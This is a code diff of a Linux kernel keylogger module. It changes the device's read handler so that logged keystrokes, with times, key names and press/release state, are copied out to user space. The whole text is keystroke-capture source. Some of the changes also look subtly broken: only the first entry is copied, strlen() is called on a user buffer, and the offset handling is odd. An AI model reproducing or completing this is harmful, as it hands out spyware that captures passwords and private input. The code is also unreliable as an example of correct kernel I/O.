@@ -8,17 +8,31 @@ MODULE_DESCRIPTION("Module keylog");
 
 t_keylst	*k_lst = NULL;
 
-void		display_list_element(t_keylst *node)
+void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t len)
 {
 	char	message[128] = {0};
+	int	msg_len;
 
-	sprintf(message, "%ld:%ld:%ld %s (%d) %s", (node->time.tv_sec / 3600) % 24, \
+	sprintf(message, "%ld:%ld:%ld %s (%d) %s\n", (node->time.tv_sec / 3600) % 24, \
 			(node->time.tv_sec / 60) % 60, node->time.tv_sec % 60, \
 		       	node->name, node->key, node->state ? "Released" : "Pressed");
-	printk(KERN_INFO "%s\n", message);
+	msg_len = strlen(message);
+	if (**offset == 0 && len > msg_len)
+	{
+		if (!copy_to_user(buffer, message, msg_len))
+		{
+			**offset += msg_len;
+			printk(KERN_INFO "in copy_to_user\n");
+		}
+		else
+		{
+			printk(KERN_INFO "copy to user failed \n");
+		}
+	}
+	printk(KERN_INFO "%s", message);
 }
 
-int		browse_linked_list(t_keylst *lst)
+int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len)
 {
 	t_keylst	*tmp;
 
@@ -27,7 +41,7 @@ int		browse_linked_list(t_keylst *lst)
 	tmp = k_lst;
 	while (tmp)
 	{
-		display_list_element(tmp);
+		display_list_element(tmp, buffer, offset, len);
 		tmp = tmp->next;
 	}
 	return 0;
@@ -36,8 +50,12 @@ int		browse_linked_list(t_keylst *lst)
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
 	printk(KERN_INFO "keylogger: in read\n");
-	if (browse_linked_list(k_lst))
-		return 1;
+	if (!browse_linked_list(k_lst, buffer, &offset, len))
+	{
+		*offset = 0;
+		return strlen(buffer);
+	}
+	printk(KERN_INFO "keylogger: offset [%lld]\n", *offset);
 	return 0;
 }
 
